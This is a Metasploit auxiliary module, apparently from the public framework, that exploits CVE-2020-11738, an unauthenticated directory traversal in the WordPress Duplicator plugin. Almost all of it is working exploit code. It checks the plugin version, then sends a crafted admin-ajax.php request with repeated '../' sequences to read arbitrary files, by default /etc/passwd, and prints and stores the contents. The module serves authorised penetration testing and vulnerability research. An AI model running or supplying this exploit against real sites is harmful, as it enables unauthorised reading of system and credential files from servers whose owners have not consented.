##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress Duplicator File Read Vulnerability',
        'Description' => %q{
          This module exploits an unauthenticated directory traversal vulnerability in WordPress plugin
          'Duplicator' version 1.3.24-1.3.26, allowing arbitrary file read with the web server privileges.
          This vulnerability was being actively exploited when it was discovered.
        },
        'References' => [
          ['CVE', '2020-11738'],
          ['WPVDB', '10078'],
          ['URL', 'https://snapcreek.com/duplicator/docs/changelog'],
          ['URL', 'https://www.wordfence.com/blog/2020/02/active-attack-on-recently-patched-duplicator-plugin-vulnerability-affects-over-1-million-sites/']
        ],
        'Author' => [
          'Ramuel Gall', # Vulnerability discovery
          'Hoa Nguyen - SunCSR Team' # Metasploit module
        ],
        'DisclosureDate' => '2020-02-19',
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
        OptInt.new('DEPTH', [true, 'Traversal Depth (to reach the root folder)', 5])
      ]
    )
  end

  def check_host(_ip)
    result = check_plugin_version_from_readme('duplicator', '1.3.28', '1.3.24')
    version = result.details[:version]
    case result.code
    when 'appears'
      Exploit::CheckCode::Appears("Duplicator #{version} predates the fixed version 1.3.28", details: result.details)
    when 'safe'
      Exploit::CheckCode::Safe("Duplicator #{version} is outside this module's supported affected range", details: result.details)
    else
      result
    end
  rescue Rex::ConnectionError, Rex::TimeoutError, OpenSSL::SSL::SSLError => e
    elog('Duplicator version request failed', error: e)
    Exploit::CheckCode::Unknown('Duplicator version request failed to connect or complete')
  end

  def run_host(ip)
    traversal = '../' * datastore['DEPTH']
    filename = datastore['FILEPATH']
    filename = filename[1, filename.length] if filename =~ %r{^/}

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
      'vars_get' =>
                    {
                      'action' => 'duplicator_download',
                      'file' => "#{traversal}#{filename}"
                    }
    })

    fail_with(Failure::Unreachable, 'Duplicator download request did not receive a response') unless res
    if [401, 403].include?(res.code)
      fail_with(Failure::NoAccess, "Duplicator download request was denied (HTTP #{res.code})")
    end
    fail_with(Failure::UnexpectedReply, "Duplicator download request returned HTTP #{res.code}") unless res.code == 200
    fail_with(Failure::UnexpectedReply, 'Duplicator download did not include byte data') unless res.body.is_a?(String)

    # The vendor sends this envelope only for actual files, including files
    # with zero bytes. Error text is not a reliable test of arbitrary contents.
    disposition = res.headers['Content-Disposition'].to_s.b.strip
    attachment = disposition.split(';', 2).first.to_s.strip.casecmp?('attachment')
    has_filename = disposition.match?(/;\s*filename\s*=\s*(?:"(?:\\.|[^"\\\r\n])+"|[^\s;"\r\n]+)\s*(?:;|\z)/i)
    content_type = res.headers['Content-Type'].to_s.split(';', 2).first.to_s.strip
    unless attachment && has_filename && !disposition.match?(/[\r\n]/) && content_type.casecmp?('application/octet-stream')
      fail_with(Failure::NotVulnerable, 'Response was not a Duplicator file download; verify FILEPATH and DEPTH')
    end

    # Rex has already decoded chunked and close-delimited responses, which
    # need not carry Content-Length. Validate it when the server provides it.
    length = res.headers['Content-Length']
    if length && (!length.to_s.strip.match?(/\A\d+\z/) || length.to_i != res.body.bytesize)
      fail_with(Failure::UnexpectedReply, 'Duplicator download length did not match the received bytes')
    end

    print_status('Downloading file...')
    print_line("\n#{res.body}\n")

    fname = datastore['FILEPATH']

    path = store_loot(
      'duplicator.traversal',
      'text/plain',
      ip,
      res.body,
      fname
    )
    print_good("File saved in: #{path}")
  rescue Rex::ConnectionError, Rex::TimeoutError, OpenSSL::SSL::SSLError => e
    elog('Duplicator download request failed', error: e)
    fail_with(Failure::Unreachable, 'Duplicator download request failed to connect or complete')
  end
end
